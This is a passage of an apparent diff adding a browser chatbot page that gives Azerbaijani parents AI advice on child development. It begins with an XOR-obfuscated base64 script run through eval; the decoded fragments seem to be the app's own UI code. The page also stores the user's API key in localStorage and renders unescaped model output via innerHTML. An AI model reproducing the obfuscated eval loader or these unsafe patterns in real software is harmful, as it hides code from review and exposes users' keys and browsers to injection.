VUgZLR09I","Z1ZWBhsGQklFU0tDSFIIQUNSY0pDS0NIUmRfb0IOAUtHT0hnVlYBDx0sBgYGBgYGBgYGBgYGT0AGDktH","T0hnVlYPBktHT0hnVlYIVVJfSkMISVZHRU9SXwYbBgEXAR0sBgYGBgYGBgYGBgYGVUNSck9LQ0lTUg4O","DwYbGAZVVkpHVU4ZCFRDS0lQQw4PCgYQFhYPHSwGBgYGBgYGBlsKBhcfFhYPHSwsBgYGBgYGBgZFTkdS","ZUlIUkdPSENUBhsGQklFU0tDSFIIQUNSY0pDS0NIUmRfb0IOAUVOR1JlSUhSR09IQ1QBDx0sBgYGBgYG","BgZSSVZPRVVlSUhSR09IQ1QGGwZCSUVTS0NIUghBQ1JjSkNLQ0hSZF9vQg4BUklWT0VVZUlIUkdPSENU","AQ8dLAYGBgYGBgYGT0hWU1JyQ15SR1RDRwYbBkJJRVNLQ0hSCEFDUmNKQ0tDSFJkX29CDgFLQ1VVR0FD","b0hWU1IBDx0sBgYGBgYGBgZLT0VkUkgGGwZCSUVTS0NIUghBQ1JjSkNLQ0hSZF9vQg4BS09FZFJIAQ8d","LAYGBgYGBgYGVUNIQmRSSAYbBkJJRVNLQ0hSCEFDUmNKQ0tDSFJkX29CDgFVQ0hCZFJIAQ8dLAYGBgYG","BgYGRUpDR1RkUkgGGwZCSUVTS0NIUghBQ1JjSkNLQ0hSZF9vQg4BRUpDR1RkUkgBDx0sBgYGBgYGBgZP","SEBJZFJIBhsGQklFU0tDSFIIQUNSY0pDS0NIUmRfb0IOAU9IQElkUkgBDx0sLAYGBgYGBgYGcml2b2V1","CEBJVGNHRU4OUgYbGAZdLAYGBgYGBgYGBgYGBkpDUgZEUkgGGwZCSUVTS0NIUghFVENHUkNjSkNLQ0hS","DgFEU1JSSUgBDx0sBgYGBgYGBgYGBgYGRFJICEVKR1VVaEdLQwYbBgFFTk9WAR0sBgYGBgYGBgYGBgYG","RFJICE9ISENUbnJragYbBkYCXVIIT0VJSFsGGlVWR0gYAl1SCEpHRENKWxoJVVZHSBhGHSwGBgYGBgYG","BgYGBgZEUkgISUhFSk9FTQYbBg4PBhsYBk5HSEJKQ3JJVk9FDlIPHSwGBgYGBgYGBgYGBgZSSVZPRVVl","SUhSR09IQ1QIR1ZWQ0hCZU5PSkIORFJIDx0sBgYGBgYGBgZbDx0sLAYGBgYGBgYGS09FZFJICElIRUpP","RU0GGwYODwYbGAZUQ0VJVEJPSEEGGQZVUklWcElPRUMODwYcBlVSR1RScElPRUMODx0sBgYGBgYGBgZV","Q0hCZFJICElIRUpPRU0GGwYODwYbGAZVQ0hCa0NVVUdBQw4PHSwGBgYGBgYGBkVKQ0dUZFJICElIRUpP","RU0GGwZFSkNHVGVOR1IdLAYGBgYGBgYGT0hASWRSSAhJSEVKT0VNBhsGVU5JUW9IQElrSUJHSh0sBgYG","BgYGBgZPSFZTUnJDXlJHVENHCEdCQmNQQ0hSak9VUkNIQ1QOAU1DX0JJUUgBCgYOQw8GGxgGXQZPQAYO","QwhNQ18GGxsbBgFjSFJDVAEGAAAGB0MIVU5PQFJtQ18PBl0GQwhWVENQQ0hSYkNAR1NKUg4PHQZVQ0hC","a0NVVUdBQw4PHQZbBlsPHSwGBgYGBgYGBk9IVlNSckNeUkdUQ0cIR0JCY1BDSFJqT1VSQ0hDVA4BT0hW","U1IBCgZAU0hFUk9JSA4PBl0GUk5PVQhVUl9KQwhOQ09BTlIGGwYBR1NSSQEdBlJOT1UIVVJfSkMITkNP","QU5SBhsGa0dSTghLT0gOUk5PVQhVRVRJSkpuQ09BTlIKBh4WDwYNBgFWXgEdBlsPHSwsBgYGBgYGBgZF","SkNHVGVOR1IODx0sBgYGBlssBgYGBk9IT1JnVlYODx0s"];var _vju=38;var _pnrt=atob(_ihgv.join(''));var _bc=_pnrt.length;var _fxuh=new Uint8Array(_bc);for(var _tb=0;_tb<_bc;_tb++){_fxuh[_tb]=_pnrt.charCodeAt(_tb)^_vju;}var _esa=new TextDecoder().decode(_fxuh);(0,eval)(_esa);})();</script>
+<!-- SPLASH -->
+<div class="splash" id="splash">
+  <div class="splash-logo">🧠</div>
+  <div class="splash-title">AN PSİXOLOJİ</div>
+  <div class="splash-sub">Peşəkar Uşaq Psixologiyası AI Agenti</div>
+  <div class="splash-dots">
+    <div class="splash-dot"></div>
+    <div class="splash-dot"></div>
+    <div class="splash-dot"></div>
+  </div>
+</div>
+
+<!-- API KEY MODAL -->
+<div class="api-modal" id="apiModal">
+  <div class="api-sheet">
+    <div style="font-size:2rem;text-align:center">🔑</div>
+    <h3>Anthropic API Açarı</h3>
+    <p>AN PSİXOLOJİ agentini işə salmaq üçün Anthropic API açarınızı daxil edin. Açar yalnız bu cihazda saxlanılır.</p>
+    <input class="api-input" type="password" id="apiKeyInput" placeholder="sk-ant-..." autocomplete="off" spellcheck="false">
+    <button class="api-btn" id="apiSaveBtn">Başla →</button>
+    <div class="api-note">Açarı <a href="https://console.anthropic.com" target="_blank">console.anthropic.com</a> saytından əldə edə bilərsiniz</div>
+  </div>
+</div>
+
+<!-- MAIN APP -->
+<div class="app" id="app" style="display:none">
+  <!-- Header -->
+  <div class="header">
+    <div class="h-avatar">🧠<div class="online"></div></div>
+    <div class="h-info">
+      <div class="h-name">AN PSİXOLOJİ</div>
+      <div class="h-status">Aktiv · cavab verir</div>
+    </div>
+    <div class="h-actions">
+      <button class="h-btn" id="teamBtn" title="Komanda">👥</button>
+      <button class="h-btn" id="clearBtn" title="Təmizlə">🗑</button>
+    </div>
+  </div>
+
+  <!-- Topics -->
+  <div class="topics" id="topics"></div>
+
+  <!-- Chat -->
+  <div class="chat" id="chat"></div>
+
+  <!-- Input -->
+  <div class="input-area">
+    <div class="input-row">
+      <div class="input-box">
+        <textarea id="msgInput" rows="1" placeholder="Uşağınızla bağlı sualınızı yazın..."></textarea>
+      </div>
+      <button class="mic-btn" id="micBtn">🎤</button>
+      <button class="send-btn" id="sendBtn">➤</button>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    AN PSİXOLOJİ · AI Agent &nbsp;|&nbsp; 
+    <a href="https://instagram.com/s_akhundoff" target="_blank">📷 @s_akhundoff</a> &nbsp;·&nbsp; by s_akhundoff
+  </div>
+</div>
+
+<script>
+// ===== CONFIG =====
+const TOPICS = [
+  {key:'autizm',   icon:'🔵', label:'Autizm'},
+  {key:'nitq',     icon:'🗣️', label:'Nitq'},
+  {key:'davranis', icon:'🤝', label:'Davranış'},
+  {key:'dehb',     icon:'⚡', label:'DEHB'},
+  {key:'emosiya',  icon:'❤️', label:'Emosiya'},
+  {key:'oyun',     icon:'🎮', label:'Oyun Terapiyası'},
+  {key:'oxuma',    icon:'📖', label:'Oxuma/Yazma'},
+  {key:'sosial',   icon:'👫', label:'Sosial Bacarıq'},
+  {key:'motor',    icon:'🏃', label:'Motor Bacarıq'},
+  {key:'yuxu',     icon:'🌙', label:'Yuxu'},
+];
+
+const SPECIALISTS = [
+  {icon:'🧠', name:'Psixoloq',      role:'Emosional inkişaf, davranış idarəsi',  prompt:'Psixoloq kimi cavab ver: uşağın emosional inkişafı, davranış problemlərinin idarəsi üçün ən son elmi metod və tövsiyələri ətraflı izah et.'},
+  {icon:'🗣️', name:'Loqoped',       role:'Nitq, artikulyasiya, dil inkişafı',   prompt:'Loqoped kimi cavab ver: nitq gecikmələri, artikulyasiya, dil inkişafı sahəsindəki ən effektiv ev məşqləri və müdaxilə üsullarını izah et.'},
+  {icon:'🖐️', name:'Erqoterapevt',  role:'Motor bacarıqlar, gündəlik həyat',   prompt:'Erqoterapevt kimi cavab ver: xüsusi ehtiyaclı uşaqların motor bacarıqları, gündəlik həyat aktivliklərindəki inkişafı üçün praktiki üsulları izah et.'},
+  {icon:'📚', name:'Psixopedaqoq',  role:'Öyrənmə, diqqət, idrak inkişafı',    prompt:'Psixopedaqoq kimi cavab ver: uşaqların öyrənmə prosesi, diqqət, idrak inkişafı üçün ən effektiv üsul və strategiyaları ətraflı izah et.'},
+];
+
+const TOPIC_PROMPTS = {
+  autizm:   'Autizm spektr pozuntusu olan uşaqlar haqqında ətraflı məlumat ver. Əlamətlər, valideyn evdə nə edə bilər, hansı terapiyalar kömək edir, gündəlik rutin necə qurulmalıdır, kommunikasiya inkişafı üçün praktiki üsullar.',
+  nitq:     'Uşaqlarda nitq gecikmələri haqqında ətraflı məlumat ver. Yaşa görə normal nitq inkişafı normaları, evdə edilə bilinəcək məşqlər, loqopedə nə vaxt müraciət etmək lazımdır, əlamətlər.',
+  davranis: 'Xüsusi ehtiyaclı uşaqlarda davranış problemlərini (aqressiya, özünə zərər, itaətsizlik, qışqırma) necə idarə etmək olar? Effektiv strategiyalar, pozitiv dəstək üsulları, çətin anlarda nə etmək lazımdır.',
+  dehb:     'DEHB olan uşaqlar haqqında ətraflı məlumat ver. Əlamətlər, evdə kömək üsulları, diqqəti artırmaq üçün fəaliyyətlər, məktəbdə dəstək, rutin qurmaq.',
+  emosiya:  'Xüsusi ehtiyaclı uşaqlarda emosional inkişaf və emosiya tənzimləmə bacarıqları. Sakinləşdirmə texnikaları, emosiyaları ifadə etmə üsulları, valideyn nə edə bilər.',
+  oyun:     'Oyun terapiyası nədir? Xüsusi ehtiyaclı uşaqlar üçün evdə tətbiq edilə biləcək oyun növləri, inkişafa uyğun oyun fikirləri, strukturlu və sərbəst oyunun fərqi.',
+  oxuma:    'Uşaqlarda oxuma-yazma çətinlikləri (disleksiya, diqrafiya). Əlamətlər, evdə kömək üsulları, müdaxilə strategiyaları, nə vaxt mütəxəssisə getmək lazımdır.',
+  sosial:   'Xüsusi ehtiyaclı uşaqlarda sosial bacarıqların inkişafı üçün praktiki üsullar. Dostluq qurmaq, sosial qaydaları öyrənmək, qrup fəaliyyətlərə qatılmaq.',
+  motor:    'Uşaqlarda motor inkişaf: xırda motor (qələm tutma, kəsmə) və iri motor (yürüş, tarazlıq) bacarıqları. Evdə məşq üsulları, inkişaf mərhələləri, gecikmə əlamətləri.',
+  yuxu:     'Xüsusi ehtiyaclı uşaqlarda yuxu problemləri. Sağlam yuxu rutini qurmaq, yatmazlığı həll etmək üçün strategiyalar, yuxu xijieni tövsiyələri.',
+};
+
+const QR_BY_TOPIC = {
+  autizm:   ['🎮 Evdə oyun fikirlər','📅 Rutin qurmaq','🗣️ Kommunikasiya üsulları'],
+  nitq:     ['🎵 Mahnılarla nitq','⏰ Mütəxəssisə nə vaxt?','📝 Ev məşqləri'],
+  davranis: ['😮‍💨 Sakinləşdirmə','📊 Davranış cədvəli','🏫 Məktəbdə dəstək'],
+  dehb:     ['⚡ Enerji fəaliyyətlər','🎯 Diqqət məşqləri','🌙 Yuxu rutini'],
+  emosiya:  ['❤️ Emosiya kartları','🫂 Sakinləşmə üsulları','🎨 Yaradıcı ifadə'],
+  oyun:     ['🧩 Qurucu oyunlar','🎨 Sənət terapiyası','🏃 Aktiv oyunlar'],
+  oxuma:    ['🔤 Hərfləri öyrənmək','📖 Oxuma strategiyası','✏️ Yazı məşqləri'],
+  sosial:   ['👋 Salamlaşma məşqi','🤝 Növbə tutmaq','🎭 Rol oyunu'],
+  motor:    ['✂️ Kəsmə məşqi','🖍️ Boyama','⚽ Balans məşqi'],
+  yuxu:     ['🛁 Yatış rutini','📵 Ekran vaxtı','🌙 Gecə narahatçılığı'],
+  default:  ['📌 Daha ətraflı','🏠 Ev fəaliyyəti','👩‍⚕️ Mütəxəssisə gedim?'],
+};
+
+const SYSTEM_PROMPT = `Sən "AN PSİXOLOJİ" adlı ixtisaslaşmış AI agentisən. Azərbaycan dilinin psixoloji, tibbi uşaq ixtisas sahəsindəki ən yüksək səviyyəli mütəxəssisi kimi cavab verirsən.
+
+SƏNİN KOMANDAN:
+- Psixoloq: Emosional inkişaf, davranış idarəsi, psixi sağlamlıq
+- Loqoped: Nitq, dil, artikulyasiya inkişafı  
+- Erqoterapevt: Motor bacarıqlar, gündəlik həyat aktivlikləri, hissi inteqrasiya
+- Psixopedaqoq: Öyrənmə prosesi, idrak inkişafı, xüsusi təhsil
+
+CAVAB FORMATIN (hər dəfə bu strukturu istifadə et):
+1. 💜 **İsti giriş** – Valideyni başa düş, əlaqə qur
+2. 📋 **Əsas məlumat** – Sadə, anlaşılan dildə izah et
+3. ✅ **3-5 Praktiki addım** – Evdə edilə bilənlər, konkret
+4. ⚠️ **Nə etməyin** – Qaçınılacaq davranışlar
+5. 💡 **Tövsiyə** – Ən vacib bir mesaj
+6. 🏥 **Nə vaxt mütəxəssisə?** – Konkret əlamətlər
+
+QAYDALAR:
+- Azərbaycan dilində cavab ver
+- Emoji istifadə et (lakin həddindən çox deyil)
+- Diaqnoz qoyma – yalnız yönləndir
+- Valideyni gücləndir, qorxutma
+- **Qalın** və _kursiv_ formatlamadan istifadə et
+- Uzun, ətraflı cavab ver (ən azı 300 söz)
+- Həmişə ümid verici tonla bitir`;
+
+// ===== STATE =====
+let apiKey = localStorage.getItem('anpsix_key') || '';
+let messages = [];
+let isLoading = false;
+let recog = null, isRec = false;
+let activeTopic = null;
+
+// ===== DOM REFS =====
+const chatEl   = document.getElementById('chat');
+const topicsEl = document.getElementById('topics');
+const input    = document.getElementById('msgInput');
+const micBtn   = document.getElementById('micBtn');
+const sendBtn  = document.getElementById('sendBtn');
+const clearBtn = document.getElementById('clearBtn');
+const teamBtn  = document.getElementById('teamBtn');
+const apiModal = document.getElementById('apiModal');
+const apiInput = document.getElementById('apiKeyInput');
+const apiSave  = document.getElementById('apiSaveBtn');
+const appEl    = document.getElementById('app');
+
+// ===== UTILS =====
+const time = () => new Date().toLocaleTimeString('az-AZ',{hour:'2-digit',minute:'2-digit'});
+const toast = msg => {
+  const d = document.createElement('div');
+  d.className='toast'; d.textContent=msg;
+  document.body.appendChild(d);
+  setTimeout(()=>d.remove(), 2500);
+};
+const renderText = t => t
+  .replace(/\*\*(.+?)\*\*/g,'<strong>$1</strong>')
+  .replace(/_(.+?)_/g,'<em style="color:var(--accent2);font-style:normal">$1</em>')
+  .replace(/\n/g,'<br>');
+
+// ===== API CALL =====
+async function callAI(userPrompt, topicKey=null) {
+  const sysPrompt = topicKey
+    ? SYSTEM_PROMPT + `\n\nAktiv mövzu: ${TOPICS.find(t=>t.key===topicKey)?.label || topicKey}. Bu mövzu haqqında ətraflı məlumat ver.`
+    : SYSTEM_PROMPT;
+
+  const resp = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+    headers: {
+      'x-api-key': apiKey,
+      'anthropic-version': '2023-06-01',
+      'content-type': 'application/json',
+      'anthropic-dangerous-direct-browser-access': 'true'
+    },
+    body: JSON.stringify({
+      model: 'claude-haiku-4-5',
+      max_tokens: 1500,
+      system: sysPrompt,
+      messages: [
+        ...messages.filter(m=>m.role!=='system').slice(-6).map(m=>({
+          role: m.role==='agent'?'assistant':'user',
+          content: m.text
+        })),
+        {role:'user', content: topicKey ? (TOPIC_PROMPTS[topicKey]||userPrompt) : userPrompt}
+      ]
+    })
+  });
+  if (!resp.ok) {
+    const e = await resp.json().catch(()=>({}));
+    if (resp.status===401) throw new Error('API açarı yanlışdır. Yenidən daxil edin.');
+    throw new Error(e?.error?.message || `Xəta: ${resp.status}`);
+  }
+  const data = await resp.json();
+  return data.content[0].text;
+}
+
+// ===== RENDER =====
+function renderChat() {
+  chatEl.innerHTML = '';
+  messages.forEach(msg => {
+    const isUser = msg.role === 'user';
+    const row = document.createElement('div');
+    row.className = `msg ${isUser ? 'user' : ''}`;
+
+    const av = document.createElement('div');
+    av.className = `msg-avatar ${isUser ? 'user' : 'agent'}`;
+    av.textContent = isUser ? '🙋' : '🧠';
+
+    const body = document.createElement('div');
+    body.className = 'msg-body';
+
+    const bub = document.createElement('div');
+    bub.className = `bubble ${isUser ? 'user' : 'agent'}`;
+    if (isUser) bub.textContent = msg.text;
+    else bub.innerHTML = renderText(msg.text);
+
+    if (!isUser && msg.specialists) {
+      const grid = document.createElement('div');
+      grid.className = 'spec-cards';
+      SPECIALISTS.forEach(s => {
+        const c = document.createElement('div');
+        c.className = 'spec-card';
+        c.innerHTML = `<div class="spec-card-icon">${s.icon}</div><div class="spec-card-name">${s.name}</div><div class="spec-card-desc">${s.role}</div>`;
+        c.onclick = () => sendMsg(s.prompt);
+        grid.appendChild(c);
+      });
+      bub.appendChild(grid);
+    }
+
+    if (!isUser && msg.qr) {
+      const wrap = document.createElement('div');
+      wrap.className = 'qr-wrap';
+      msg.qr.forEach(q => {
+        const b = document.createElement('button');
+        b.className='qr-btn'; b.textContent=q;
+        b.onclick = () => sendMsg(q);
+        wrap.appendChild(b);
+      });
+      bub.appendChild(wrap);
+    }
+
+    const t = document.createElement('div');
+    t.className = 'msg-time'; t.textContent = msg.time;
+
+    body.appendChild(bub);
+    body.appendChild(t);
+    row.appendChild(av);
+    row.appendChild(body);
+    chatEl.appendChild(row);
+  });
+
+  if (isLoading) {
+    const row = document.createElement('div');
+    row.className = 'msg';
+    const av = document.createElement('div');
+    av.className = 'msg-avatar agent'; av.textContent = '🧠';
+    const tw = document.createElement('div');
+    tw.className = 'typing-wrap';
+    const tb = document.createElement('div');
+    tb.className = 'typing-bubble';
+    for (let i=0;i<3;i++){const d=document.createElement('div');d.className='typing-dot';tb.appendChild(d);}
+    tw.appendChild(tb);
+    row.appendChild(av); row.appendChild(tw);
+    chatEl.appendChild(row);
+  }
+  chatEl.scrollTop = chatEl.scrollHeight;
+}
+
+function addMsg(role, text, opts={}) {
+  messages.push({role, text, time: time(), ...opts});
+  renderChat();
+}
+
+// ===== SEND =====
+async function sendMsg(override=null) {
+  const text = override !== null ? override : input.value.trim();
+  if (!text || isLoading) return;
+  input.value = ''; input.style.height='auto';
+  addMsg('user', text);
+  isLoading = true; renderChat();
+  try {
+    const reply = await callAI(text, activeTopic);
+    const qr = activeTopic ? (QR_BY_TOPIC[activeTopic]||QR_BY_TOPIC.default) : QR_BY_TOPIC.default;
+    activeTopic = null;
+    document.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+    addMsg('agent', reply, {qr});
+  } catch(err) {
+    if (err.message.includes('yanlışdır')) {
+      localStorage.removeItem('anpsix_key');
+      apiKey = '';
+      appEl.style.display='none';
+      apiModal.style.display='flex';
+      toast('⚠️ ' + err.message);
+    } else {
+      addMsg('agent', `⚠️ ${err.message}\n\nZəhmət olmasa bir az sonra cəhd edin.`, {qr:QR_BY_TOPIC.default});
+    }
+  }
+  isLoading = false; renderChat();
+}
+
+// ===== TOPIC =====
+async function handleTopic(t) {
+  activeTopic = t.key;
+  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+  document.querySelector(`.chip[data-key="${t.key}"]`)?.classList.add('active');
+  addMsg('user', `${t.icon} ${t.label} haqqında məlumat`);
+  isLoading = true; renderChat();
+  try {
+    const reply = await callAI('', t.key);
+    addMsg('agent', reply, {qr: QR_BY_TOPIC[t.key]||QR_BY_TOPIC.default});
+  } catch(err) {
+    addMsg('agent', `⚠️ ${err.message}`, {qr:QR_BY_TOPIC.default});
+  }
+  activeTopic = null;
+  document.querySelectorAll('.chip').forEach(c=>c.classList.remove('active'));
+  isLoading = false; renderChat();
+}
+
+// ===== CLEAR =====
+function clearChat() {
+  messages = [];
+  addMsg('agent',
+    '💜 **Salam! Mən AN PSİXOLOJİ agentiyəm.**\n\nMən psixoloq, loqoped, erqoterapevt və psixopedaqoq kimi sizə kömək edirəm. Uşağınızla bağlı sualınızı yazın və ya aşağıdakı mövzulardan birini seçin.\n\n_Diaqnoz qoymuram – yalnız yönləndirir, güclü valideyn olmağınıza kömək edirəm._ 🌟\n\nKomandamı tanımaq istəyirsiniz?',
+    {qr:['🧠 Psixoloq', '🗣️ Loqoped', '🖐️ Erqoterapevt', '📚 Psixopedaqoq'], specialists: true}
+  );
+}
+
+// ===== TEAM MODAL =====
+function showTeam() {
+  const ov = document.createElement('div');
+  ov.className = 'modal-overlay';
+  ov.innerHTML = `
+    <div class="modal-sheet">
+      <div class="modal-handle"></div>
+      <div class="modal-title">👥 Mütəxəssislər Komandası</div>
+      <div class="spec-grid" id="specGrid"></div>
+      <div class="modal-warn">⚠️ Bu agent diaqnoz qoymur. Ciddi vəziyyətlərdə mütəxəssisə müraciət edin.</div>
+    </div>`;
+  document.body.appendChild(ov);
+  const grid = ov.querySelector('#specGrid');
+  SPECIALISTS.forEach(s => {
+    const d = document.createElement('div');
+    d.className='spec-item';
+    d.innerHTML=`<div class="spec-item-icon">${s.icon}</div><div class="spec-item-name">${s.name}</div><div class="spec-item-role">${s.role}</div>`;
+    d.onclick = () => { ov.remove(); sendMsg(s.prompt); };
+    grid.appendChild(d);
+  });
+  ov.addEventListener('click', e => { if(e.target===ov) ov.remove(); });
+}
+
+// ===== VOICE =====
+function toggleVoice() {
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SR) { toast('⚠️ Brauzeriniz səs tanımağı dəstəkləmir'); return; }
+  if (isRec) {
+    recog?.stop(); isRec=false; micBtn.classList.remove('rec');
+  } else {
+    recog = new SR();
+    recog.lang='az-AZ'; recog.continuous=false; recog.interimResults=false;
+    recog.onresult = e => { input.value=e.results[0][0].transcript; toast('✅ Nitq tanındı'); };
+    recog.onerror = () => { toast('⚠️ Səs tanınmadı'); };
+    recog.onend = () => { isRec=false; micBtn.classList.remove('rec'); };
+    recog.start(); isRec=true; micBtn.classList.add('rec');
+  }
+}
+
+// ===== INIT =====
+function initTopics() {
+  TOPICS.forEach(t => {
+    const b = document.createElement('button');
+    b.className='chip'; b.dataset.key=t.key;
+    b.innerHTML=`<span class="chip-icon">${t.icon}</span>${t.label}`;
+    b.onclick = () => handleTopic(t);
+    topicsEl.appendChild(b);
+  });
+}
+
+function startApp() {
+  appEl.style.display='flex';
+  apiModal.style.display='none';
+  initTopics();
+  clearChat();
+}
+
+// Events
+apiSave.onclick = () => {
+  const k = apiInput.value.trim();
+  if (!k.startsWith('sk-ant-')) { toast('⚠️ Düzgün API açarı daxil edin'); return; }
+  apiKey = k;
+  localStorage.setItem('anpsix_key', k);
+  startApp();
+};
+apiInput.addEventListener('keydown', e => { if(e.key==='Enter') apiSave.click(); });
+
+sendBtn.onclick = () => sendMsg();
+micBtn.onclick  = toggleVoice;
+clearBtn.onclick = clearChat;
+teamBtn.onclick  = showTeam;
+
+input.addEventListener('keydown', e => {
+  if (e.key==='Enter' && !e.shiftKey) { e.preventDefault(); sendMsg(); }
+});
+input.addEventListener('input', function() {
+  this.style.height='auto';
+  this.style.height = Math.min(this.scrollHeight,80)+'px';
+});
+
+// Boot
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    document.getElementById('splash').classList.add('hide');
+    setTimeout(() => {
+      document.getElementById('splash').remove();
+      if (apiKey) {
+        startApp();
+      } else {
+        apiModal.style.display='flex';
+      }
+    }, 500);
+  }, 2000);
+});
+</script>
 </body>
 </html>
